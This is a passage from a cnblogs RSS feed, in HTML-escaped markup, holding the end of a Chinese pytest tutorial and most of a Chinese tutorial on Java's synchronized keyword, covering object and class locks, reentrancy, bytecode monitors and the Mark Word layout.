&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import pytest

print pytest.main()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
(wda_python) bash-&lt;span&gt;3.2&lt;/span&gt;&lt;span&gt;$ python pytestDemo.py 
&lt;/span&gt;========================================================== test session starts ===========================================================&lt;span&gt;
platform darwin &lt;/span&gt;-- Python &lt;span&gt;2.7&lt;/span&gt;.&lt;span&gt;15&lt;/span&gt;, pytest-&lt;span&gt;4.1&lt;/span&gt;.&lt;span&gt;0&lt;/span&gt;, py-&lt;span&gt;1.7&lt;/span&gt;.&lt;span&gt;0&lt;/span&gt;, pluggy-&lt;span&gt;0.8&lt;/span&gt;.&lt;span&gt;0&lt;/span&gt;&lt;span&gt;
rootdir: &lt;/span&gt;/Users/jackey/Documents/iOS/code/iOS-Auto/&lt;span&gt;Agent_Test, inifile:
collected &lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt; items                                                                                                                        

test_sample.py .F                                                                                                                  [ &lt;/span&gt;&lt;span&gt;66&lt;/span&gt;%&lt;span&gt;]
test_sysexit.py .                                                                                                                  [&lt;/span&gt;&lt;span&gt;100&lt;/span&gt;%&lt;span&gt;]

&lt;/span&gt;================================================================ FAILURES ================================================================&lt;span&gt;
___________________________________________________________ TestClass.test_two ___________________________________________________________

self &lt;/span&gt;= &amp;lt;test_sample.TestClass &lt;span&gt;object&lt;/span&gt; at &lt;span&gt;0x1038ba650&lt;/span&gt;&amp;gt;&lt;span&gt;

    def test_two(self):
        x &lt;/span&gt;= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;hello&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
&amp;gt;       assert hasattr(x, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;check&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
E       AssertionError: assert False
E        &lt;/span&gt;+  &lt;span&gt;where&lt;/span&gt; False = hasattr(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;hello&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;check&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)

test_sample.py:&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;&lt;span&gt;: AssertionError
&lt;/span&gt;=================================================== &lt;span&gt;1&lt;/span&gt; failed, &lt;span&gt;2&lt;/span&gt; passed &lt;span&gt;in&lt;/span&gt; &lt;span&gt;0.05&lt;/span&gt; seconds ===================================================
&lt;span&gt;1&lt;/span&gt;&lt;span&gt;
(wda_python) bash&lt;/span&gt;-&lt;span&gt;3.2&lt;/span&gt;$ 
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;我们还可以在main中传递参数:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
pytest.main(['-q','test_sample.py'])
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;给pytest.main添加plugin, 如下示例在执行的开头和结尾， 添加打印信息&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre readability=&quot;11&quot;&gt;
import pytest&lt;p&gt;class MyPlugin(object):&lt;br/&gt;def pytest_sessionfinish(self):&lt;br/&gt;print '*** Test run reporting finishing'&lt;/p&gt;&lt;p&gt;def pytest_sessionstart(self):&lt;br/&gt;print '*** Test run report beginning'&lt;/p&gt;&lt;p&gt;pytest.main(['-q','test_sample.py'], plugins=[MyPlugin()])
&lt;/p&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;47&quot;&gt;
&lt;p&gt;(wda_python) bash-3.2$ python pytestDemo.py&lt;br/&gt;*** Test run report beginning&lt;br/&gt;.F [100%]*** Test run reporting finishing&lt;/p&gt;
&lt;p&gt;================================================================ FAILURES ================================================================&lt;br/&gt;___________________________________________________________ TestClass.test_two ___________________________________________________________&lt;/p&gt;
&lt;p&gt;self = &amp;lt;test_sample.TestClass object at 0x1090843d0&amp;gt;&lt;/p&gt;
&lt;p&gt;def test_two(self):&lt;br/&gt;x = 'hello'&lt;br/&gt;&amp;gt; assert hasattr(x, 'check')&lt;br/&gt;E AssertionError: assert False&lt;br/&gt;E + where False = hasattr('hello', 'check')&lt;/p&gt;
&lt;p&gt;test_sample.py:11: AssertionError&lt;br/&gt;1 failed, 1 passed in 0.05 seconds&lt;/p&gt;
&lt;/div&gt;

</description>
<pubDate>Wed, 09 Jan 2019 06:47:00 +0000</pubDate>
<dc:creator>周希</dc:creator>
<og:description>自动化测试框架 - pytest pytest是Python最流行的单元测试框架之一, 帮助更便捷的编写测试脚本， 并支持多种功能复杂的测试场景， 能用来做app测试也能用作函数测试 官方文档:</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/zhouxihi/p/10244320.html</dc:identifier>
</item>
<item>
<title>深入理解synchronized关键字 - Marksmanbat</title>
<link>http://www.cnblogs.com/-Marksman/p/10232382.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/-Marksman/p/10232382.html</guid>
<description>
&lt;div id=&quot;wmd-preview&quot; class=&quot;wmd-preview&quot; readability=&quot;76.113295354249&quot;&gt;

&lt;p data-anchor-id=&quot;73lp&quot;&gt;synchronized是并发编程中重要的使用工具之一，我们必须学会使用并且掌握它的原理。&lt;/p&gt;
&lt;h2 id=&quot;概念及作用&quot; data-anchor-id=&quot;m43s&quot;&gt;概念及作用&lt;/h2&gt;
&lt;p data-anchor-id=&quot;crf2&quot;&gt;JVM自带的关键字，可在需要线程安全的业务场景中使用，来保证线程安全。&lt;/p&gt;
&lt;h2 id=&quot;用法&quot; data-anchor-id=&quot;fuai&quot;&gt;用法&lt;/h2&gt;
&lt;p data-anchor-id=&quot;h7t2&quot;&gt;按照锁的对象区分可以分为&lt;strong&gt;对象锁&lt;/strong&gt;和&lt;strong&gt;类锁&lt;/strong&gt;&lt;br/&gt;按照在代码中的位置区分可以分为&lt;strong&gt;方法形式&lt;/strong&gt;和&lt;strong&gt;代码块形式&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;对象锁&quot; data-anchor-id=&quot;47yg&quot;&gt;对象锁&lt;/h3&gt;
&lt;p data-anchor-id=&quot;mpxo&quot;&gt;锁对象为当前&lt;strong&gt;this&lt;/strong&gt;或者说是&lt;strong&gt;当前类&lt;/strong&gt;的实例对象&lt;/p&gt;
&lt;div class=&quot;md-section-divider&quot; readability=&quot;7&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
 &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;synchronized&lt;/span&gt;&lt;span&gt; method(){
    System.out.println(&lt;/span&gt;&quot;我是普通方法形式的对象锁&quot;&lt;span&gt;);
 }
 &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; method(){
     &lt;/span&gt;&lt;span&gt;synchronized&lt;/span&gt;(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;){
     　　System.out.println(&lt;/span&gt;&quot;我是代码块形式的对象锁&quot;&lt;span&gt;);&lt;br/&gt;　　　}
 }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;h3 id=&quot;类锁&quot; data-anchor-id=&quot;5tcf&quot;&gt;类锁&lt;/h3&gt;
&lt;p data-anchor-id=&quot;eyg2&quot;&gt;锁的是当前类或者指定类的Class对象。一个类可能有多个实例对象，但它只可能有一个Class对象。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public static void synchronized method(){
　　System.out.println(&lt;/span&gt;&quot;我是静态方法形式的类锁&quot;&lt;span&gt;);
}
public void method(){
　　&lt;/span&gt;&lt;span&gt;synchronized&lt;/span&gt;(*.&lt;span&gt;class&lt;/span&gt;&lt;span&gt;){
　　　　System.out.println(&lt;/span&gt;&quot;我是代码块形式的类锁&quot;&lt;span&gt;);
　　}
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;simpleexample&quot; data-anchor-id=&quot;94or&quot;&gt;SimpleExample&lt;/h2&gt;
&lt;p data-anchor-id=&quot;z2yi&quot;&gt;[参考] &lt;a href=&quot;https://www.imooc.com/learn/1086&quot; target=&quot;_blank&quot;&gt;https://www.imooc.com/learn/1086&lt;/a&gt; 【慕课网，Java高并发之魂：synchronized深度解析】&lt;/p&gt;
&lt;p data-anchor-id=&quot;onfc&quot;&gt;最基本的用法在上一个标题用法中已将伪代码列出，这里列举在以上基础上稍微变化一些的用法&lt;br/&gt;1.多个实例，对当前实例加锁，同步执行，对当前类Class对象加锁，异步执行&lt;/p&gt;
&lt;div class=&quot;md-section-divider&quot; readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public class SimpleExample implements Runnable{
　　static SimpleExample instance1 &lt;/span&gt;= &lt;span&gt;new SimpleExample();
　　static SimpleExample instance2 &lt;/span&gt;= &lt;span&gt;new SimpleExample();&lt;br/&gt;　　@Override
　　public void run(){
　　　　method1();
　　　　method2();
　　　　method3();
　　　　method4();
　　}&lt;br/&gt;　　public synchronized void method1(){
　　　　common();
　　}&lt;br/&gt;　　public static synchronized void method2(){
　　　　commonStatic();
　　}&lt;br/&gt;　　public void method3(){
　　　　&lt;/span&gt;&lt;span&gt;synchronized&lt;/span&gt;(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;){
　　　　　　common();
　　　　}
　　}&lt;br/&gt;　　public void method4(){
　　　　&lt;/span&gt;&lt;span&gt;synchronized&lt;/span&gt;(MultiInstance.&lt;span&gt;class&lt;/span&gt;&lt;span&gt;){
　　　　　　common();
　　　　}
　　}&lt;br/&gt;　　public void method5(){
　　　　common();
　　}&lt;br/&gt;　　public void method6(){
　　　　commonStatic();
　　}&lt;br/&gt;　　public void common(){
　　　　System.out.println(&lt;/span&gt;&quot;线程 &quot;+Thread.currentThread().getName()+&quot; 正在执行&quot;&lt;span&gt;);
　　　　&lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;{
　　　　　　Thread.sleep(&lt;/span&gt;1000&lt;span&gt;);
　　　　}&lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt;(InterruptedException e){
　　　　　　e.printStackTrace();
　　　　}
　　　　System.out.println(&lt;/span&gt;&quot;线程 &quot;+Thread.currentThread().getName()+&quot; 执行完毕&quot;&lt;span&gt;);
　　}&lt;br/&gt;　　public static void commonStatic(){
　　　　System.out.println(&lt;/span&gt;&quot;线程 &quot;+Thread.currentThread().getName()+&quot; 正在执行&quot;&lt;span&gt;);
　　　　&lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;{
　　　　　　Thread.sleep(&lt;/span&gt;1000&lt;span&gt;);
　　　　}&lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt;(InterruptedException e){
　　　　　　e.printStackTrace();
　　　　}
　　　　System.out.println(&lt;/span&gt;&quot;线程 &quot;+Thread.currentThread().getName()+&quot; 执行完毕&quot;&lt;span&gt;);
　　}
　　public static void main(String[] args)throws InterruptedException{
　　　　Thread t1 &lt;/span&gt;= &lt;span&gt;new Thread(instance1);
　　　　Thread t2 &lt;/span&gt;= &lt;span&gt;new Thread(instance2);
　　　　t1.start();
　　　　t2.start();
　　　　t1.join();
　　　　t2.join();
　　　　System.out.println(&lt;/span&gt;&quot;finished&quot;&lt;span&gt;);
　　}
}
method1()、method3()结果为：
线程Thread&lt;/span&gt;-&lt;span&gt;0正在执行
线程Thread&lt;/span&gt;-&lt;span&gt;1正在执行
线程Thread&lt;/span&gt;-&lt;span&gt;0执行完毕
线程Thread&lt;/span&gt;-&lt;span&gt;1执行完毕
finished&lt;br/&gt;method2()、method4()执行结果为：
线程Thread&lt;/span&gt;-&lt;span&gt;0正在执行
线程Thread&lt;/span&gt;-&lt;span&gt;0执行完毕
线程Thread&lt;/span&gt;-&lt;span&gt;1正在执行
线程Thread&lt;/span&gt;-&lt;span&gt;1执行完毕
finished&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p data-anchor-id=&quot;f0zp&quot;&gt;2.对象锁和类锁，锁的对象不一样，互不影响，所以异步执行&lt;/p&gt;
&lt;div class=&quot;md-section-divider&quot; readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将run方法改为&lt;/span&gt;
&lt;span&gt;@Override
public void run(){
　　&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&quot;Thread-0&quot;&lt;span&gt;.equals(Thread.currentThread().getName())){
　　　　method1();
　　}&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
　　　　method2();
}
}
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将main方法改为&lt;/span&gt;
&lt;span&gt;public static void main(String[] args) throws InterruptedException{
Thread t1 &lt;/span&gt;= &lt;span&gt;new Thread(instance1);
Thread t2 &lt;/span&gt;= &lt;span&gt;new Thread(instance1);
t1.start();
t2.start();
t1.join();
t2.join();
System.out.println(&lt;/span&gt;&quot;finished&quot;&lt;span&gt;);
}
结果为：
线程Thread&lt;/span&gt;-&lt;span&gt;0正在执行
线程Thread&lt;/span&gt;-&lt;span&gt;1正在执行
线程Thread&lt;/span&gt;-&lt;span&gt;1执行完毕
线程Thread&lt;/span&gt;-&lt;span&gt;0执行完毕
finished&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;/div&gt;
&lt;p data-anchor-id=&quot;daqr&quot;&gt;3.对象锁和无锁得普通方法，普通方法不需要持有锁，所以异步执行&lt;/p&gt;
&lt;div class=&quot;md-section-divider&quot; readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将run方法改为&lt;/span&gt;
&lt;span&gt;@Override
public void run(){
　　&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&quot;Thread-0&quot;&lt;span&gt;.equals(Thread.currentThread().getName())){
　　　　method1();
　　}&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
　　　　method5();
　　}
}
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; main方法同 2&lt;/span&gt;
&lt;span&gt;结果为：
线程Thread&lt;/span&gt;-&lt;span&gt;0正在执行
线程Thread&lt;/span&gt;-&lt;span&gt;1正在执行
线程Thread&lt;/span&gt;-&lt;span&gt;0执行完毕
线程Thread&lt;/span&gt;-&lt;span&gt;1执行完毕
finished&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p data-anchor-id=&quot;ba4z&quot;&gt;4.类锁和无锁静态方法，异步执行&lt;/p&gt;
&lt;div class=&quot;md-section-divider&quot; readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将run方法改为&lt;/span&gt;
&lt;span&gt;@Override
public void run(){
　　&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&quot;Thread-0&quot;&lt;span&gt;.equals(Thread.currentThread().getName())){
　　　　method1();
　　}&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
　　　　method6();
　　}
}
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; main方法同 2&lt;/span&gt;
&lt;span&gt;结果为：
线程Thread&lt;/span&gt;-&lt;span&gt;0正在执行
线程Thread&lt;/span&gt;-&lt;span&gt;1正在执行
线程Thread&lt;/span&gt;-&lt;span&gt;0执行完毕
线程Thread&lt;/span&gt;-&lt;span&gt;1执行完毕
finished&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p data-anchor-id=&quot;v8lk&quot;&gt;5.方法抛出异常，synchronized锁自动释放&lt;/p&gt;
&lt;div class=&quot;md-section-divider&quot; readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; run方法改为&lt;/span&gt;
&lt;span&gt;@Override
public void run(){
　　&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&quot;Thread-0&quot;&lt;span&gt;.equals(Thread.currentThread().getName())){
　　　　method7();
　　}&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
　　　　method8();
　　}
}
public synchronized void method7(){
　　&lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;{
　　　　...
　　　　throw new Exception();
　　}&lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt;(Exception e){
　　　　e.printStackTrace();
　　}
}
public synchronized void method8(){
　　common();
}
public static void main(String[] args) throws InterruptedException{
　　&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 同 2&lt;/span&gt;
&lt;span&gt;}
结果为：
线程Thread&lt;/span&gt;-&lt;span&gt;0正在执行
java.lang.Exception
at com.marksman.theory2practicehighconcurrency.synchronizedtest.blog.SynchronizedException.method7(SynchronizedException.java:&lt;/span&gt;26&lt;span&gt;)
at com.marksman.theory2practicehighconcurrency.synchronizedtest.blog.SynchronizedException.run(SynchronizedException.java:&lt;/span&gt;15&lt;span&gt;)
at java.lang.Thread.run(Thread.java:&lt;/span&gt;748&lt;span&gt;)
线程Thread&lt;/span&gt;-&lt;span&gt;0执行结束
线程Thread&lt;/span&gt;-&lt;span&gt;1正在执行
线程Thread&lt;/span&gt;-&lt;span&gt;1执行结束
finished
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 这说明抛出异常后持有对象锁的method7()方法释放了锁，这样method8()才能获取到锁并执行。&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p data-anchor-id=&quot;ax5c&quot;&gt;6.可重入特性&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public class SynchronizedRecursion{
　　&lt;/span&gt;&lt;span&gt;int&lt;/span&gt; a =0&lt;span&gt;;
　　&lt;/span&gt;&lt;span&gt;int&lt;/span&gt; b =0&lt;span&gt;;
　　private void method1(){
　　　　System.out.println(&lt;/span&gt;&quot;method1正在执行，a = &quot;+&lt;span&gt; a);
　　　　&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(a ==0&lt;span&gt;){
　　　　　　a &lt;/span&gt;++&lt;span&gt;;
　　　　　　method1();
　　　　}
　　　　System.out.println(&lt;/span&gt;&quot;method1执行结束，a = &quot;+&lt;span&gt; a);
　　}
　　private synchronized void method2(){
　　　　System.out.println(&lt;/span&gt;&quot;method2正在执行，b = &quot;+&lt;span&gt; b);
　　　　&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(b == 0&lt;span&gt;){
　　　　　　b &lt;/span&gt;++&lt;span&gt;;
　　　　　　method2();
　　　　}
　　　　System.out.println(&lt;/span&gt;&quot;method2执行结束，b = &quot;+&lt;span&gt; b);
　　}
　　public static void main(String[] args){
　　　　SynchronizedRecursion synchronizedRecursion &lt;/span&gt;= &lt;span&gt;new SynchronizedRecursion();
　　　　synchronizedRecursion.method1();
　　　　synchronizedRecursion.method2();
　　}
}
结果为：
method1正在执行，a &lt;/span&gt;=0&lt;span&gt;
method1正在执行，a &lt;/span&gt;=1&lt;span&gt;
method1执行结束，a &lt;/span&gt;=1&lt;span&gt;
method1执行结束，a &lt;/span&gt;=1&lt;span&gt;
method2正在执行，b &lt;/span&gt;=0&lt;span&gt;
method2正在执行，b &lt;/span&gt;=1&lt;span&gt;
method2执行结束，b &lt;/span&gt;=1&lt;span&gt;
method2执行结束，b &lt;/span&gt;=1
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 可以看到method1()与method2()的执行结果一样的，method2()在获取到对象锁以后，在递归调用时不需要等上一次调用先释放后再获取，而是直接进入，这说明了synchronized的可重入性.
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 当然，除了递归调用，调用同类的其它同步方法，调用父类同步方法，都是可重入的，前提是同一对象去调用，这里就不一一列举了.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p data-anchor-id=&quot;2iby&quot;&gt;总结一下&lt;/p&gt;
&lt;ul data-anchor-id=&quot;7ugn&quot;&gt;&lt;li&gt;一把锁只能同时被一个线程获取，没有拿到锁的线程必须等待；&lt;/li&gt;
&lt;li&gt;每个实例都对应有自己的一把锁，不同实例之间互不影响；&lt;/li&gt;
&lt;li&gt;锁对象是*.class以及synchronized修饰的static方法时，所有对象共用一把类锁；&lt;/li&gt;
&lt;li&gt;无论是方法正常执行完毕或者方法抛出异常，都会释放锁；&lt;/li&gt;
&lt;li&gt;使用synchronized修饰的方法都是可重入的。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;synchronized的实现原理&quot; data-anchor-id=&quot;fnml&quot;&gt;synchronized的实现原理&lt;/h2&gt;
&lt;h3 id=&quot;monitorenter和monitorexit&quot; data-anchor-id=&quot;ox2b&quot;&gt;monitorenter和monitorexit&lt;/h3&gt;
&lt;p data-anchor-id=&quot;imn4&quot;&gt;将下面两段代码分别用 javac *.java编译成.class文件，再反编译 javap -verbose *.class文件&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public class SynchronizedThis{
　　public void method(){
　　　　&lt;/span&gt;&lt;span&gt;synchronized&lt;/span&gt;(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;){}
　　}
}&lt;br/&gt;&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 反编译结果&lt;/span&gt;
&lt;span&gt;public void method();
descriptor:()V
flags: ACC_PUBLIC
Code:
stack&lt;/span&gt;=2, locals=3, args_size=1
0&lt;span&gt;: aload_0
&lt;/span&gt;1&lt;span&gt;: dup
&lt;/span&gt;2&lt;span&gt;: astore_1
&lt;/span&gt;3&lt;span&gt;: monitorenter
&lt;/span&gt;4&lt;span&gt;: aload_1
&lt;/span&gt;5&lt;span&gt;: monitorexit
&lt;/span&gt;6&lt;span&gt;:goto14
&lt;/span&gt;9&lt;span&gt;: astore_2
&lt;/span&gt;10&lt;span&gt;: aload_1
&lt;/span&gt;11&lt;span&gt;: monitorexit
&lt;/span&gt;12&lt;span&gt;: aload_2
&lt;/span&gt;13&lt;span&gt;: athrow
&lt;/span&gt;14:&lt;span&gt;return&lt;/span&gt;&lt;span&gt;
 
public class SynchronizedMethod{
　　public synchronized void method(){}
}&lt;br/&gt;&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 反编译结果&lt;/span&gt;
&lt;span&gt;public synchronized void method();
descriptor:()V
flags: ACC_PUBLIC, ACC_SYNCHRONIZED
Code:
stack&lt;/span&gt;=0, locals=1, args_size=1
0:&lt;span&gt;return&lt;/span&gt;&lt;span&gt;
LineNumberTable:
line &lt;/span&gt;2:0
&lt;/pre&gt;&lt;/div&gt;
&lt;p data-anchor-id=&quot;kqvm&quot;&gt;可以看到：&lt;/p&gt;
&lt;ul data-anchor-id=&quot;cg0v&quot;&gt;&lt;li&gt;synchronized加在代码块上，JVM是通过&lt;strong&gt;monitorenter&lt;/strong&gt;和&lt;strong&gt;monitorexit&lt;/strong&gt;来控制锁的获取的释放的；&lt;/li&gt;
&lt;li&gt;synchronized加在方法上，JVM是通过&lt;strong&gt;ACC_SYNCHRONIZED&lt;/strong&gt;来控制的，但本质上也是通过monitorenter和monitorexit指令控制的。&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;对象头&quot; data-anchor-id=&quot;413s&quot;&gt;对象头&lt;/h3&gt;
&lt;p&gt;[参考]  &lt;a href=&quot;https://www.jianshu.com/p/3d38cba67f8b&quot; target=&quot;_blank&quot;&gt;https://www.jianshu.com/p/3d38cba67f8b&lt;/a&gt; 【简书，Java对象头详解】&lt;/p&gt;
&lt;p data-anchor-id=&quot;zw9g&quot;&gt;上面我们提到monitor，这是什么鬼？&lt;br/&gt;其实，对象在内存是这样存储的，包括&lt;strong&gt;对象头&lt;/strong&gt;、&lt;strong&gt;实例数据&lt;/strong&gt;和&lt;strong&gt;对齐填充Padding&lt;/strong&gt;，其中对象头包括&lt;br/&gt;Mark Word和类型指针。&lt;/p&gt;
&lt;h4 id=&quot;mark-word&quot; data-anchor-id=&quot;b5rc&quot;&gt;Mark Word&lt;/h4&gt;
&lt;p data-anchor-id=&quot;jd6c&quot;&gt;Mark Word用于存储对象自身的运行时数据，如哈希码（identity_hashcode）、GC分代年龄(age)、锁状态标志(lock)、线程持有的锁、偏向线程ID(thread)、偏向时间戳(epoch)等等，占用内存大小与虚拟机位长一致。&lt;/p&gt;
&lt;table class=&quot;table table-striped-white table-bordered&quot; data-anchor-id=&quot;dcji&quot;&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;span&gt;Mark Word (32 bits)&lt;/span&gt;&lt;/th&gt;
&lt;th&gt;&lt;span&gt;State 锁状态&lt;/span&gt;&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;6&quot;&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;&lt;span&gt;identity_hashcode:25 | age:4 | biased_lock:1 | lock:2&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;Normal 无锁&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;&lt;span&gt;thread:23 | epoch:2 | age:4 | biased_lock:1 | lock:2&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;Biased 偏向锁&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;&lt;span&gt;ptr_to_lock_record:30 | lock:2&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;Lightweight Locked 轻量级锁&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;&lt;span&gt;ptr_to_heavyweight_monitor:30 | lock:2&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;Heavyweight Locked 重量级锁&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;| lock:2&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;Marked for GC GC标记&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;table class=&quot;table table-striped-white table-bordered&quot; data-anchor-id=&quot;z0bp&quot;&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;span&gt;Mark Word (64 bits)&lt;/span&gt;&lt;/th&gt;
&lt;th&gt;&lt;span&gt;State 锁状态&lt;/span&gt;&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;6&quot;&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;&lt;span&gt;unused:25|identity_hashcode:31|unused:1|age:4|biased_lock:1|lock:2&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;Normal 无锁&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;&lt;span&gt;thread:54 |epoch:2|unused:1|age:4|biased_lock:1|lock:2&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;Biased 偏向锁&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;&lt;span&gt;ptr_to_lock_record:62 | lock:2&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;Lightweight Locked 轻量级锁&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;&lt;span&gt;ptr_to_heavyweight_monitor:62 | lock:2&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;Heavyweight Locked 重量级锁&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;| lock:2&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;Marked for GC GC标记&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p data-anchor-id=&quot;upni&quot;&gt;可以看到，monitor就存在Mark Word中。&lt;/p&gt;
&lt;h4 id=&quot;类型指针&quot; data-anchor-id=&quot;x5sn&quot;&gt;类型指针&lt;/h4&gt;
